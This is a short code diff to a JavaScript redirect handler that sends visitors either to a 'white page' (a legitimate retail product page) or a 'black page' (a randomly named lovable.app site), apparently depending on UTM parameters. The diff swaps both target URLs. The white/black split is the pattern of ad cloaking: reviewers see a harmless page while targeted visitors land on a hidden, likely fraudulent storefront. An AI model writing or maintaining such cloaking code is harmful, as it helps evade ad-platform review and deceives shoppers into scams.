@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://purebaby.com.au/products/llama-fiesta-short-growsuit-cacti-print";
-    const blackPageURL = "https://csshhpluv.lovable.app/";
+    const whitePageURL = "https://www.nordstrom.com/s/azelie-floral-print-gown/8535148?origin=coordinating-8535148-0-3-PDP_2.SEEDED_SUB_1-recbot-vertex_fbt_v3&recs_placement=PDP_2.SEEDED_SUB-1&recs_strategy=vertex_fbt_v3&recs_source=recbot&recs_page_type=product&recs_seed=8386592&color=BLACK";
+    const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
